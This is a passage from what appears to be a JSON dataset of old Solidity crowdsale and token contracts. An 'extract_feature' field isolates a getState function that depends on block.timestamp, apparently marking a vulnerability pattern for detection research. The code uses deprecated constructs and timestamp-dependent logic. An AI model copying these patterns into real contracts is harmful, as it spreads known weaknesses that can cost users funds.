balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract MintedTokenCappedCrowdsaleExt is CrowdsaleExt {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsaleExt(\n string _name,\n address _token,\n PricingStrategy _pricingStrategy,\n address _multisigWallet,\n uint _start, uint _end,\n uint _minimumFundingGoal,\n uint _maximumSellableTokens,\n bool _isUpdatable,\n bool _isWhiteListed\n ) CrowdsaleExt(_name, _token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, _isUpdatable, _isWhiteListed) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n event MaximumSellableTokensChanged(uint newMaximumSellableTokens);\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isBreakingInvestorCap(address addr, uint tokenAmount) public constant returns (bool limitBroken) {\n assert(isWhiteListed);\n uint maxCap = earlyParticipantWhitelist[addr].maxCap;\n return (tokenAmountOf[addr].plus(tokenAmount)) > maxCap;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function setMaximumSellableTokens(uint tokens) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n maximumSellableTokens = tokens;\n MaximumSellableTokensChanged(maximumSellableTokens);\n }\n function updateRate(uint newOneTokenInWei) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n pricingStrategy.updateRate(newOneTokenInWei);\n }\n function assignTokens(address receiver, uint tokenAmount) private {\n MintableTokenExt mintableToken = MintableTokenExt(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f99"
  },
  "filename": "9806.sol",
  "content": "pragma solidity ^0.4.8;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if 